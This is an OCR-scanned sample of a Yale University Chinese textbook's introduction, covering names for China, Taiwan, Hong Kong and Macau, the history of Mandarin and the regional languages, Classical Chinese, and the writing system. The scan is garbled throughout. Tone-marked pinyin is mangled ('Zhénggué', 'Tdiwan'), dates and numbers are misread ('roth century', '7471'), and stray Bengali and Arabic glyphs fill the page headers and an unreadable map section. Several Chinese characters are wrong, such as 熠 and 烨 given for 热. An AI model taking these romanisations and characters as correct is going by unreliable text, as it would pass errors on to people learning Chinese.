lan-\nguages (‘dialects’), and brand names. Such topics are easily enriched with\nonline materials such as satellite maps, photographs, video clips, and advertise-\nments. They are also easy to transform into effective classroom activities.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xxix\n\nThe language learner as explorer\n\nIt is my belief that, given the enormity of the task of learning a new language\n(which I sometimes liken to repairing a car while driving it, or renovating your\nhouse while still living in it), it is helpful to be as interested in the new language\nas it is to be fascinated by the new culture—of which language is a part. Unfor-\ntunately, writing about language tends to be dry and unnecessarily technical.\nUntil now, there has been no ‘Indiana Jones’ for linguists. In Learning Chinese,\nwe have not only made the language the focus of some conversations and nar-\nratives, but we have also frequently gone out of the way to comment on the\nhistory, structure, and delightful quirks that are scattered across the linguistic\nterrain. In my own experience, one of the main topics of conversation with\nChinese friends all over the world has been the language itself, whether it be\nregional accents, local usage, or the Chinese equivalent of ‘splat’. (Which is,\nincidentally, bid, a sound for which, officially at least, there is no character.)\nThe other two common subjects of conversation are weather and, as you might\nexpect, food; therefore, these two topics are also given some prominence in\nLearning Chinese.\n\nLearning Chinese is exuberant rather than restrained. Its Chinese content is\ncurrent and lively, with subjects that range from ordering food to bargaining,\nfrom religion to the Chinese school system. It is also larded with quotations,\nrhymes, popular culture, linguistic information, and historical and geographi-\ncal notes. It is intended to be an intellectually stimulating resource for both\nstudents and teachers alike.\n\nBasic geography\n\nNames for China\n\nThe immediate source of the name ‘China’ is thought to be a Persian word’,\nwhich appeared in European languages during the 16th or 17th century as a\nname for porcelain, that was then applied to the country from which the finest\nexamples of that material came. If this is correct, then ‘China’ derives from\n‘china’, not the other way around.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nXXX INTRODUCTION\n\nAnother name, Cathay, now rather poetic in English but surviving as the\nregular name for the country in languages such as Russian (‘Kitai’), as well as\nin the name of the Hong Kong-based airline Cathay Pacific, is said to derive\nfrom the name of the Khitan (or Qitan) Tartars, who formed the Liao dynasty\nin the north of China during the roth century. The Liao dynasty was the first\nto make a capital in the region of modern Beijing.\n\nThe Chinese now call their country Zhonggué, often translated as ‘Middle\nKingdom’. Originally, this name meant the central, or royal, state of the many\nthat occupied the region prior to the Qin unification in 221 BCE. Other names\nwere used before Zhénggué became current. One of the earliest was Hud (or\nHudxia, combining Hud with the name of the earliest dynasty, the Xia). Hud,\ncombined with the Zhong of Zhonggué, appears in the modern official name of\nthe country—as the following entries show.\n\nThe People’s Republic of China (PRC)—Zhénghud Rénmin Gonghégué\n\nThe PRC is the political entity proclaimed by Mao Zedong when he gave the\ninaugural speech (‘China has risen again’) at the Gate of Heavenly Peace\n(Tian’anmén) in Beijing on October 1, 1949. The PRC also claims sovereignty\nover Taiwan and all other regions currently controlled by the government in\nTaipei.\n\nThe Republic of China (ROC)—Zhénghud Mingué\n\nThe ROC was the name of the political entity established in 1912, after the fall\nof the Manchu Qing dynasty, which took place the previous year. The man\nmost responsible for the founding of the Republic was Sun Yat-sen (San\nYixidan in Mandarin), and for this, he has earned the epithet ‘Father of the\nCountry’. Although he was named provisional president in 1911, fears for the\nunity of the country led to the appointment of Yuan Shih-k’ai (Yudn Shikai),\nan important military and diplomatic official under the Qing, as the first presi-\ndent of the Republic in 1912. In 1949, the president of the Republic, Chiang\nKai-shek (Jidng Jiéshi), fled with the government to Taiwan and maintained the\nname Republic of China as part of his claim to be the only legitimate govern-\nment of the whole of China. De facto control, however, has been limited to the\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION ১০০\n\nisland of Taiwan, clusters of islands in the Taiwan Straits, the ‘offshore islands’\nof Quemoy (Jinmén) and Matsu (Mazii) close to the mainland, and some minor\nislands in the South China Sea and to the east of Taiwan. In recent years, even\nin formal contexts (such as on recent postage stamps), ‘Taiwan’ sometimes\ntakes the place of ‘Republic of China’ as a name for the political entity.\n\nTaiwan—Tdiwan\n\nTaiwan is some 210 kilometers off the coast of eastern China’s Fujian province;\nits central mountains are just visible from the Fujian coast on a clear day. The\nDutch colonized the island in the early 17th century, fighting off the Spanish,\nwho had also established bases on the northern part of the island. The Dutch\ncalled the island Formosa, from the name Ilha Formosa ‘beautiful island’, given\nto it earlier by the Portuguese (who did not actually colonize it).\n\nTaiwan’s earliest inhabitants spoke Austronesian languages unrelated to\nChinese, and indigenous groups such as the Ami, Paiwan, and Bunan (who\nstill speak non-Chinese languages) are descendents of those early Taiwan\nAustronesians. By the 13th century, Chinese speaking Hakka and Fukienese—\nregional Chinese languages—had established small communities on the island.\nThese were joined by refugees from the Ming after the fall of that dynasty on\nthe mainland. The Qing dynasty annexed Taiwan in 1683, making it a province.\nIn 1895, Taiwan, along with nearby islands such as the Pescadores group\n(Pknghi Liéddo), was ceded to Japan as part of the settlement of the Sino-Jap-\nanese war. It remained a Japanese colony until 1945, when it was returned to\nthe Republic of China.\n\nUnder the Nationalist government, Mandarin (Guéyt) was made the official\nlanguage of the country, while Taiwanese (Tdiyii), a form of Southern Min\nspoken by the majority of its population, was suppressed. In recent years,\nhowever, Taiwanese has undergone a resurgence in public life.\n\nHong Kong 一 Xiang Gang\n\nHong Kong lies within the Cantonese-speaking region of southern China. The\nEnglish name derives from the Cantonese pronunciation of the place, ‘Heung\nGong’, which means ‘fragrant harbor’ (Xiang Gdng in Mandarin). Hong Kong\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n১০০1 INTRODUCTION\n\nwas formally ceded to the British in the Treaty of Nanking (Nanjing), which\nwas signed at the end of the Opium War in 1842 on a ship anchored in the\nYangtze River, slightly to the east of Nanjing. The Kowloon Peninsula (Jiiilong\n‘nine dragons’) was added in 1860 after the Second Opium War, and the New\nTerritories (Xinjié), which includes islands and mainland territory, were leased\nto the British in 1898 for 99 years, making Hong Kong total slightly more than\n1,000 square kilometers.\n\nIn 1984, well before the expiration of the New Territories lease, Prime Min-\nister Margaret Thatcher and Chairman Deng Xiaoping formulated the Sino-\nBritish Joint Declaration, an agreement for the return of Hong Kong to Chinese\nsovereignty. In 1990, the principle of ‘One Country, Two Systems’ [Yi Gud,\nLidng Zhi] was formulated: Hong Kong would retain its laws and a high degree\nof political autonomy for 50 years. At midnight on July 1, 1997, Hong Kong\nbecame a Special Administrative Region [Tébié Xingzhéngqi] of China, which\nguaranteed it autonomy within the PRC in all but foreign affairs and defense.\n\nHistorically, Hong Kong has been settled by a number of distinct Chinese\ngroups. These include the Bendi (‘locals’), who emigrated during the Song\ndynasty (roth-I3 也 century) after being driven from their homes in north\nChina; the Tanka, fisherfolk who lived on boats and are thought by some to be\nthe descendents of the non-Han Yue people; the Hokla, early immigrants from\nFujian; the Hakka, who ended up mostly in less fertile parts of the New Ter-\nritories; and numerous clans and people from nearby Cantonese-speaking\nregions, as well as other parts of China. Despite its small size, Hong Kong has\nmore successfully preserved the traces of many traditional Chinese social forms\nand practices than have many other parts of the Chinese-speaking world.\n\nMacau—Aomeén\n\nSixty kilometers to the west of Hong Kong, across the Pearl River estuary, is\nAomén, known in English as Macau. The Chinese and English names have\ndifferent sources. Aomén, means, literally, ‘gate to the inlet’; but the Portuguese\nname, ‘Macao’ (English Macau), is said to derive from the name of a revered\nlocal temple, called ‘Maagok’ in Cantonese (Magé), dedicated to Matsu, a\ngoddess worshipped by fishermen and sailors’.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION ১০০0\n\nThe peninsula of Macau was settled by the Portuguese in 1557, and was\nadministered by them for over 400 years, though the question of who held\nsovereignty was not resolved? until 1999, when it reverted completely to Chinese\nterritory. The two small islands of Coloane and Taipa were added to the terri-\ntory in the middle of the 190] century, and later connected to the Macau pen-\ninsula by bridges. Recently, the islands have been joined by landfill, and the\ncentral portion has become the site of the Cotai Strip, envisioned as an Asian\nversion of the Las Vegas strip—only larger. Macau is the only place in China\nwhere gambling is legal.\n\nChinese lands; Chinese overseas\n\nInformally, the two Chinese political entities are often referred to as Mainland\nChina (Zhonggub Dalu)—or simply ‘the Mainland’—and Taiwan, rather than\nthe PRC and the ROC. The occasional need to talk about a single Chinese entity,\nconsisting of the Chinese mainland plus Hong Kong and Taiwan, has recently\ngiven rise to a term, Lidng’an Sandi (‘two-shores three-lands’).\n\nChinese who live outside the Lidng’an Sandi can be classified as Hudqido,\ngenerally translated as ‘Overseas Chinese’. In its broadest sense, Hudqido can\napply simply to ethnic Chinese living outside the Lidng’an Sandi, regardless of\nhow assimilated they are to local cultures. More typically, however, it has a\nnarrower application, referring to Chinese who retain features of Chinese\nculture in their adopted homelands and who keep ties with the motherland.\nThere is another term, Hudyi (‘Chinese-hem [of a robe]; frontier’) that is applied\nto ethnic Chinese born overseas, e.g., Méigué Hudyi ‘Chinese Americans’, etc.\n\nNationalists and Communists\n\nAfter the establishment of the PRC in 1949, it was customary to distinguish\nthe two political entities by their only extant political parties, the Communist\nParty (Géngchdnddng), abbreviated CCP, and the Nationalist Party (Guémindang,\nor Kuomintang), the KMT. Hence, ‘the Communist government’, ‘the Nation-\nalist leaders’, etc. Recent changes in Taiwan and on the Mainland make neither\nterm appropriate. In 2000, the Nationalists lost to Chen Shui-bian and the\nDemocratic Progressive Party, though they returned to power in 2008 with the\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nXXXiv INTRODUCTION\n\nelection of the KMT candidate, Ma Ying-jeou (Md Yingjiti in Mandarin). Mean-\nwhile, on the Mainland, the Communist Party, though retaining its institu-\nional position in the government, has become less of a dominating force in\npolitical life.\n\n0 500 mi\n\n\\,\n\n০ 80017 E\n\nHeLongianc )\neHarbin ‏لر‎\n\nShenyang\nUAONING\n\n৬০০79\n\nINNER MONGOLIA,\nAR:\n\nXINJANG UYGURAR\n‏وم8 ٭‎\n\nاپ سی ‎J‏ و\nکسی ‎এও Chin ae‏\n‎is claimed ‘SHANK Jinan‏\n‎MUI‏\n‎by India Sova | stanponé‏\n‎TIBET ARE Qa * ‘Zhengzhou et The Diaoyu Islands!‏\n‎id SHAAN!

For the PRC, the capital is Béijing ‘north-\nern capital’, the city that has been the capital for all but brief periods since 1422,\nwhen Emperor Yong Le of the Ming dynasty moved the government north from\nNanjing ‘southern capital’. However, in 1927, the Nationalists under Chiang\nKai-shek, having little real power in the north and under threat from the\nJapanese, made Nanjing their capital and restored the name Béiping (Peiping)\n(‘northern-peace’) that the northern city possessed before becoming capital in\n\n‎Copyright © 2011 Yale University\n\nLearning Chinese Sample\n\nINTRODUCTION XXXV\n\nthe 15th century. Officially, the Nationalists retained the name Béiping even\nafter the Japanese conquered the city of Nanjing, and continued to do so after\nBeijing reverted to the capital in 1949 under the PRC.\n\nThe spelling ‘Peking’ is probably a reflection of the Cantonese pronunciation\nof the name Beijing, in which the initial of the second syllable is pronounced\nwith a hard ‘k’ sound. Representations of Cantonese pronunciation were often\nadopted by the British as official postal spellings (cf. Nanking for Nanjing and\nChungking for Chdénggqing). Though most foreigners now spell the name of the\ncity, in Mandarin pinyin transcription, as Beijing, the old spelling and pronun-\n\nciation survive to this day in certain proper names, such as Peking University\n(still the official English name of the institution) and Peking duck. The tran-\nscription, Beijing, is not without its problems either, since speakers who do\nnot know the pinyin system tend to make the ‘j’ sound more foreign or exotic\nby giving it a French quality: [bay-zhing]. As you will soon learn, the actual\nstandard pronunciation is closer to [bay-dzing].\n\nLinguistic background\n\nChinese\n\nOne of the consequences of the long duration of Chinese history is that the\nterm ‘Chinese’ has come to have a wide range of applications. It can refer to\nthe earliest records, written on oracle bones, and dated to the second millen-\nnium BCE. It can refer to the languages in the Sinitic branch—the ‘Sino’ of the\nSino-Tibetan family—which includes not only the standard language but\nregional languages (‘dialects’) such as Cantonese and Hokkien. (In this sense,\nChinese is to the modern Chinese languages as Romance is to the modern\nLatin languages French, Spanish, Italian, and so on.) Finally, in its most narrow\nsense, it can refer to the modern standard language, often called Mandarin by\nEnglish speakers.\n\nMandarin and Chinese\n\nWhen the Portuguese began to have extensive contact with China in the late\n16th and early 17th centuries, they adapted the word ‘mandarin’ (itself adapted\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n১০০ INTRODUCTION\n\nto Portuguese from Indian and other sources) to refer to Chinese officials;\nhence modern meanings such as ‘powerful official; member of a powerful\ngroup’. They also used it for the language spoken by such officials, called\nGuanhua in Chinese, ‘the speech of officials’. Guanhua was the name given to\nspecialized speaking practices, based on northern Chinese, which served as a\nlingua franca among officials and members of other educated classes who\nmight come from different parts of China and speak mutually unintelligible\nChinese in their home regions.\n\nGuanhua can be regarded as the precursor of the modern standard language.\nIn English, the name ‘Mandarin’ has survived the transformation from special-\nized language to the modern standard, but the name Gudnhud has not. The\nChinese term only survives in the specialized terminology of linguists, who use\nthe term Béifang Guanhua Tixi ‘northern Guanhua system [of dialects]’ to refer\nto the northern dialect grouping that includes Mandarin and other distinct\ndialects now spoken over a vast stretch of territory in the north, west,\nand southwest of China. Western linguists often refer to this grouping as the\nMandarin dialects, using ‘Mandarin’ in a generic sense. The Mandarin dialects\nstand in contrast to other dialect groupings, such as the Cantonese or\nFujianese.\n\nStrange as it may seem, the Chinese-speaking world has no single term for\nmodern standard Chinese, or Mandarin. In the PRC, it is officially called\nPutonghua (‘the common language’), a term with a legacy dating back to\nthe early part of the 2oth century; in Taiwan, it is called Gudyt (‘the\nnational language’), a term dating to at least 1918; while in Singapore, it is\ncalled Hudyii (‘the language of the Hud’)—Hud being an ancient name for the\nChinese people. In ordinary speech, other terms are often used: Hanyti (‘lan-\nguage of the Han’), for example, or Zhongwén (‘Chinese-language’).\n\nMainlanders tend to find it strange that English speakers refer to the stan-\ndard language as Mandarin. Norman (1988: 136) recommends using the term\nStandard Chinese or, when possible, just Chinese, and keeping Mandarin for\nthe dialect grouping. In certain contexts, Chinese will suffice, but at times it\nwill be ambiguous, for it does not rule out Cantonese, Shanghainese, and other\nso-called ‘dialects’. The longer term, Standard Chinese, is awkward, and assumes\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION XXXVii\n\nthat there is only one standard, which makes it difficult to talk about differences\nin, say, Taiwan and Mainland Mandarin. So, in Learning Chinese, if the simple\nterm ‘Chinese’ is not sufficient, we fall back on the venerable term ‘Mandarin’,\ntaking heart from the usage of such eminent Chinese as Yuen Ren Chao, who\nwrote a much-loved textbook called Mandarin Primer (1948), and more recently,\nSingapore’s Lee Kwan Yew, who wrote a volume describing his own study\ncalled Keeping My Mandarin Alive (2005).\n\nThe origins of spoken Mandarin\nHistorically, a majority of the Chinese population spoke regional or local lan-\nguages and was illiterate. For them, there was no general medium of commu-\nnication across regional lines. For the educated, Gudnhud served in a limited\nway as a spoken medium, while Classical Chinese, the language of administra-\ntion, education, and high culture (see below), served as a written medium. By\nthe 19th century, it was clear that the lack of a spoken norm that could serve\nthe communicative needs of all classes across the country was a major obstacle\nto the modernization of China, and eventually efforts were made to identify a\nsuitable medium and promote it as the standard. Gudnhua was an obvious\ncandidate. However, by the 19th century, it had become strongly associated\nwith the educated speech of Beijing, putting southerners at a disadvantage.\nClassical Chinese, though it had no regional bias, was a highly stylized written\nlanguage with ancient roots that made it an unsuitable basis for a nationa\nspoken medium.\n\nAfter various interesting, but completely impractical, attempts to establish a\n\nhybrid language to balance regional differences (particularly between north and\nsouth) the Chinese language planners settled on a northern strategy: promoting\nthe pronunciation of the educated speech of the capital, Beijing, but incorporat-\ning material from a broad range of other sources as the basis of usage. Thus,\nwords with wide distribution were adopted over northern or Beijing localisms,\nfor example. The spoken standard also absorbed material from written sources\nthat introduced words and phrasing from the important economic and cultural\nregion of the Lower Yangtze Valley (Shanghai to Nanjing) as well as words for\nmodern concepts first coined in Japanese.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nXXxViii INTRODUCTION\n\nNorms and variation\n\nThough both Taiwan and the PRC have always agreed on the educated Beijing\nstandard for pronunciation, geographical distance, political separation, and\ncultural divergence have resulted in the emergence of two norms for spoken\nusage, as a comparison of dictionaries from Taiwan and the PRC will demon-\nstrate. These differences, though still moderate in scope, extend from the pro-\nnunciation of particular words to grammar and usage.\n\nEven within the emerging norms of Standard Chinese (Mainland and Taiwan\nversions), enormous variety exists at the local level. The case of Taiwan is illus-\ntrative. There, Gudyt (Mandarin) is not the first language of much of the popu-\nlation. The most common first language is 7471 (Taiwanese), a Southern Min\nlanguage that is very similar to the Southern Min spoken in the province of\nFujian across the Taiwan Straits. (Until the success of the ‘Speak Mandarin’\nmovement, Southern Min was also the language of most Singapore Chinese;\nelsewhere in Southeast Asia, it remains an important language in Chinese\ncommunities.)\n\nWith so many in Taiwan speaking 7471 as a first language, it is not surpris-\ning that the Mandarin spoken there is often influenced by the pronunciation,\ngrammar, and usage of Taiwanese. The result is a unique Taiwanese Mandarin.\nThe same phenomenon occurs elsewhere, of course, so that no matter where\nyou are in China, Mandarin heard on the street will generally have local fea-\ntures. Native speakers quickly get used to these differences, just as English\nspeakers get used to regional accents of English. Learners will typically find the\nvariation disruptive, and they will need time and experience to adjust to it.\n\nThough there are probably more and more Chinese who speak some variety\nof Mandarin as their first language, and whose speech is close to the appointed\nnorms, it is still true that the majority of Chinese speak more than one variety\nof Chinese, and for many of them the standard speech represented in this\ntextbook would be a second language. A few years ago, USA Today published\nstatistics on the ‘world’s most common languages, ranked by population that\nuses each as a first language’. Mandarin was listed first, with 885 million speak-\ners (followed by Spanish with 332 million and English with 322 million). The\nfigure for Mandarin does not include those who speak Cantonese or one of the\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION XXXiX\n\nother regional languages, but it must include a large number of speakers whose\nChinese would be difficult to understand by someone familiar only with the\nBeijing standard.\n\nWhen describing the best Chinese language, Chinese speakers tend to focus\non pronunciation, praising it as bidozhiin ‘standard’. For this reason, native\nChinese speakers, who tend to be effusive in their praise in any case, will some-\ntimes flatter a foreigner by saying he or she speaks the language better than\nthey do. By ‘better’, they mean with a better approximation to the standard,\neducated accent. Apart from language classrooms, the most bidozhtin Mandarin\nis heard on the broadcast media, in schools, and in the speech of young,\neducated urban Chinese.\n\nRegional languages and minority languages\n\nThere are seven major dialect groupings of Chinese, including the geographi-\ncally extensive Mandarin group (divided into southwestern, northwestern, and\nnorthern regions) mentioned earlier. Of the others, Cantonese (Yué), Shang-\nhainese (Wi), Fukienese or Hokkien (Min), and Hakka (Kéjid) are the best\nknown. (Yué, Wu, and Min are Chinese linguistic designations, while Hokkien\nand Hakka are the regional pronunciations of the names Fujian and 1810,\nrespectively.) All represent groupings of diverse dialects thought to share a\ncommon origin. Even within each group, the varieties are not necessarily mutu-\nally intelligible. Cantonese, for example, includes dialects such as Hoisan\n(Taishan) which are quite distinct from the standard dialect.\n\nIn many respects, the dialect groupings of Chinese—represented by Canton-\nese, Shanghainese, Hakka, etc.—are different languages. They are not, after\nall, mutually intelligible, and they have their own standard speeches (Guang-\nzhou for Cantonese, Suzhou for Shanghainese, etc.). In linguistic terms, they\nare often said to be comparable to Dutch and German or Spanish and Portu-\nguese. However, unlike those European languages, the Chinese ‘dialects’ share\na written language and identify with a common culture. Recently, the term\n‘topolect’, a direct translation with Greek roots of the Chinese term fangydn\n(‘place-language’), has gained currency as a more formal term for what are\ngenerally called ‘regional languages’ in this book. So we may speak of Canton-\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxl INTRODUCTION\n\nese as the standard language within the Cantonese (or Yue) grouping, and\nvarieties such as Hoisan (Tdishdn) as dialects within Cantonese.\n\nRegional languages should be distinguished from the languages of the non-\nChinese (non-Han) ethnic groups—such as the Mongolians, Tibetans, or\nUighurs—that make up about 8-9 percent of the total population of China.\nThere are 56 officially recognized ethnic minorities in China, almost all of them\nwith their own languages or language groups.\n\nA Bdi couple in their finery, Dali,\nYunnén (photograph by Jordan Gilliland)\n\nStandard Written Chinese\n\nStandard Written Chinese (or written Mandarin) is the language of composi-\ntion, learned in school and used by all educated Chinese regardless of the\nparticular variety or regional language that they speak. A Cantonese, for example,\nspeaking Taishan Cantonese at home and in the neighborhood, speaking some-\nthing closer to standard Cantonese when he or she goes to Guangzhou, and\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xli\n\nspeaking Cantonese-flavored Mandarin in certain formal or official situations,\nis taught to write a language that is different in terms of vocabulary, grammar,\nand usage from both Taishan and standard Cantonese. Even though he or she\nwould read it aloud with Cantonese pronunciation, it would in fact be more\neasily relatable to Mandarin in lexicon, grammar, and in all respects other than\npronunciation.\n\nFrom Classical Chinese to modern written Chinese\n\nWritten language always differs from spoken, for it serves quite different func-\ntions. In the case of Chinese, the difference was, until the early part of the 2oth\ncentury, extreme. Until then, most written communication, and almost all\nprinted matter, was written in a language called Wénydn ‘literary language’,\nand generally known in English as Classical Chinese. As noted earlier, it was\nthis language that served as a medium of written communication for the liter-\nate classes, much as Latin served as a medium for communication among\neducated classes in medieval Europe.\n\nClassical Chinese was unlikely ever to have been a close representation of a\nspoken language. It is thought to have had its roots in the language spoken\nsome 2,500 years ago in northern China. That language, though still Chinese\nin the sense that it is ancestral to modern Chinese languages, would have dif-\nfered quite significantly in sound, grammar, and vocabulary from any form of\nmodern Chinese. Though Classical Chinese can be regarded as a different\nlanguage from the modern, it was written in characters that have retained their\nbasic shape to the present day, and these serve to preserve the connection\nbetween ancient and modern words whose pronunciation and grammatical\ncontext is radically different. While spelling differences (that reflect changes in\npronunciation), as well a high degree of word replacement, make Old English\ntexts almost completely opaque to modern readers, ancient Chinese texts con-\ntinue to look familiar to Chinese readers despite the changes that have taken\nplace in the intervening years. Educated Chinese can read them aloud in\nmodern standard pronunciation, say, or in Cantonese or Hokkien. Without\nknowledge of the grammar and vocabulary of Classical Chinese, they may not\nfully understand them, but enough words—and, indeed, sayings and phrases—\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxlii INTRODUCTION\n\nhave survived to modern times to make the writings of Confucius (6th-5th\ncentury BCE) or the poems of Li Po (8th century CE) superficially accessible to\nthe modern reader of Chinese.\n\nClassical Chinese is still used for certain kinds of formal or ritual writing,\nmuch as Latin is used for diplomas and certain kinds of inscriptions in Western\ncountries. It has also served as a source of words, quotations, allusions, and\neven style for the modern language, both written and spoken, but relatively few\npeople read the classical language well, and only a few specialists are still able\nto write it fluently.\n\nSince Classical Chinese was not based on an accessible spoken language,\nfacility in composition required memorizing large samples to act as models.\nOnce learned, the classical language would tend to channel expression in con-\nservative directions. Citation was the main form of argument; balance and\neuphony were crucial elements of style. These features did not endear it to the\nmodernizers, and they sought to replace it with a language closer to the modern\nspoken version. They had a precedent, for all through Chinese history\nthere had in fact been genres of writing known as Bdihud (‘white—plain or\nvernacular—language’) that were rich in colloquial elements. Such genres were\nnot highly regarded or considered worthy of being literary models, but they\nwere well known as the medium of the popular Ming and Qing novels, such\nas Dream of the Red Chamber (also called the The Story of Stone), Journey to the\nWest (also known as Monkey King), or the Romance of the Three Kingdoms.\nThough it retained classical elements, Béihud provided the early model for a\nmore colloquial standard written language.\n\nBecause norms within the newly emerging written language varied, and led\nto problems of consistency and clarity, some advocated a return to Classical\nChinese as the written standard. If it could have shed some of its stylistic affec-\ntations (such as the high value put on elaborate or archaic diction), Classical\nChinese might have developed into a modern written norm much as Classical\nArabic has become the written norm of the Arabic-speaking world. Classical\nChinese, however, was too closely associated with conservatism and insularity\nat a time when China was looking to modernize. Nevertheless, a new written\nnorm does not arise overnight, and for at least the first half of the 20th century,\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xliii\n\na number of different styles across the range of classical to colloquial coexisted\nand vied for dominance. Following the revolution of 1949, written styles in\nTaiwan and the PRC diverged. In the PRC, political and other factors favored\na more colloquial written style, whereas in Taiwan, the influence of classical\nstyles has remained stronger.\n\nCharacters\n\nThe earliest extensive examples of written Chinese date from late in the second\nmillennium BCE. These are the so-called oracle bone inscriptions (jidgiiwén),\ninscribed or painted on ox bones and the bottom plate (the carapace) of tortoise\nshells. This early writing made use of characters whose forms differed in\nappearance but can still be directly related to modern characters. During the\nQin dynasty (221-206 BCE), the script was modified and standardized as part\nof the reform of government administration. The resulting style, known as the\n‘little seal’ (xido 2107), is still used on official seals (or ‘chops’). At first glance,\nlittle seal characters look quite unlike the modern versions, but a native reader\ncan often discern the correspondences.\n\nA script known as lish came into extensive use during the Han dynasty (202\nBCE-220 CE). Individual strokes in the lisha style are described as having a\n‘silkworm’s head and swallow’s tail’. It is still used occasionally for writing large\ncharacters. The modern script, the kind generally used for printed matter, is\nbased on the kdisha ‘model script’ that has been in use since before the period\nknown as the Southern and Northern Dynasties (5th and 6th centuries). Other\nvarieties of script were developed for handwriting (xingsha ‘running script’) and\ncalligraphy (cdosha ‘grass script’). Illustrations of the development of Chinese\nscript can be found at websites such as Simon Ager’s ‘Omniglot’: www.\nomniglot.com/writing/chinese_evolution.htm.\n\nTraditional and simplified characters\n\nIn the past, simpler and more complex versions of characters have often coex-\nisted. In many cases, the more complicated were used for formal correspon-\ndence, and the simpler were used for personal communications. In the 1950s,\nhowever, as part of a program to promote literacy in the PRC, a set of simpler\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxliv INTRODUCTION\n\ncharacters, most of them based on attested forms, were promoted as a general\nstandard for all printed matter. Singapore adopted the new forms for most\npurposes, but Taiwan, Hong Kong, and most overseas communities kept the\ntraditional forms; as a result, both types of (formal) characters are now in use\nin the Chinese-speaking world. In English, they are usually referred to as\n‘traditional’ and ‘simplified’. The two types are illustrated below, using the\nphrase Zhonggudre ‘fascination with Chinese’ (‘middle-kingdom-hot’), roughly\npronounced [joong-kwoh-ruh].\n\nTraditional Simplified\n\n中 国 熠 中 国 烨\nE 1\n\nZhonggubre Zhéngguore\n\nThe three characters cited illustrate the differences nicely. Many characters\nhave only one form (like zhéng); many show slight differences (like ré); others\n(like gud) show significant differences but are easily relatable. Relatively few—\nno more than a few dozen—are completely different, and most of those are\ncommonly encountered. So the differences between the two sets of characters\nare not as significant as might be imagined. A native speaker sees the relation-\nship between the two fairly easily and, using context, moves from one to the\nother without much difficulty. Students generally write only one style, but they\nshould be comfortable reading either.\n\nHomophony\n\nCharacters represent syllable-length words (or rather, morphemes—the small-\nest meaningful units of language). Since, in Chinese, these units are short, the\nchance of homophony is relatively high, more so than in English. In English,\nwords pronounced the same are often written the same, as is the case for the\n‘pens’ of ‘pig pen’ and ‘ink pen’. It is also common in English for different\nwords of identical pronunciation to be written differently, such as ‘to’, ‘too’,\nand ‘two’. Written Chinese is more comparable to the latter case: words with\nthe same pronunciation but different (and unrelated) meanings are written\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xlv\n\nwith different characters. A syllable such as shi can be written dozens of ways,\ndepending on the meaning, as the Chinese linguist Yuen Ren Chao demon-\nstrated in a tour de force whose title was:\n\n施 氏 食 狮 史\n\nShi shi shi shi shi\n\n(‘[Shi] clan eat lion story’)\n\n‘The tale of how Shi of the Shi clan ate the lion.’\n\nChao’s tale continues for another 100 or so characters, all pronounced shi in\none of the four tones. It is written in the very concise prose of Classical Chinese,\nwhich is normally read out with modern sound values; so while it is just intel-\nligible as written language, it is completely unintelligible as spoken. However,\nwritten in modern Chinese, many of the words would be disyllabic (shi ‘lion’,\nfor example, would be shizi), and the result would probably be intelligible.\nHowever, Chao’s exercise makes the point nicely: characters represent words—\nunits of sound and meaning—and letters represent sounds only.\n\nTranscribing sound in characters\n\nCharacters are sometimes used only for their sound values, with the usual\nmeanings ignored. In this way, Chinese characters can be used to transcribe\nforeign sounds. So, just as English speakers use Roman letters to write Chinese,\nChinese speakers sometimes use Chinese characters to write English (or other\nlanguages). Here is an example from a very simple Chinese-English teaching\nmanual from the Mainland (with Chinese written in simplified characters, and\nEnglish written in the Romanized system of transcription that you will soon\nlearn). See if you can figure out what English sentence is represented.\n\n节 姆 搜 普 利 丝 得 吐 斯 衣 油 厄 根 。\nAi-mii sou pii-li-si-dé tit si-yi you é-gén.\n\nCharacters are regularly used for their syllabic value, in this way, to translit-\nerate personal names, names of places, and sounds: 莎 士 比 亚 Shashibiya\n‘Shakespeare’; 密 西 西 比 Mixixibi ‘Mississippi’. Because characters can only be\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxlvi INTRODUCTION\n\nused for syllabic units, the match is not usually as good as it would be in an\nalphabetic system, which can match a symbol to each consonant and vowel\nsound.\n\nPictograms, ideograms, logograms\n\nBecause some Chinese characters derive from attempts to represent objects\npictorially, they are sometimes called ‘pictograms’. However, as you will see in\nthe character units, the majority of modern characters do not derive directly\nfrom pictorial representations; even in those cases which do, changes in the\nform of graphs brought about by processes of standardization and writing\nreform over the centuries have generally obscured any representational origins.\nThat is not to say that Chinese characters do not have certain aesthetic qualities\nthat can be exploited in poetry and art; it is just that these qualities do not\nnecessarily play a significant role in ordinary reading or writing.\n\nBecause the form of characters is not determined by sound, graphs can be\nborrowed for their meaning and given an entirely different pronunciation. So,\nfor example, the character i shan, which originated as a representation of a\nmountain, can be borrowed into Japanese to represent ‘yama’, the Japanese\nword for ‘mountain’. (The same property is found in Arabic numerals: the\ngraph ‘8’ is read ‘eight’ in English, ‘osiem’ in Polish, ‘tam’ in Vietnamese, and\nso on.) This property of characters, together with the pictorial origins of many\nof the simple graphs, has given rise to the notion that Chinese characters\nsomehow represent meaning directly without the mediation of words, hence\nthe term ‘ideogram’. This misconception is a result of viewing characters as\nsingle entities, outside of normal contexts. In running texts (in Chinese, Japa-\nnese, or even Classical Chinese), it is quite clear that readers have to identify\nwords and contexts that are linguistic, not just in the realm of thought, in order\nto perceive meaning. Neither the term ‘pictogram’ nor ‘ideogram’ applies to\nChinese characters.\n\nWriting systems are better named according to the units that they encode.\nThus, the English writing system basically encodes specific sounds (phonemes),\nthough there are some word symbols as well (e.g., &, $, %). Chinese basically\nencodes words, though characters may sometimes be called upon to 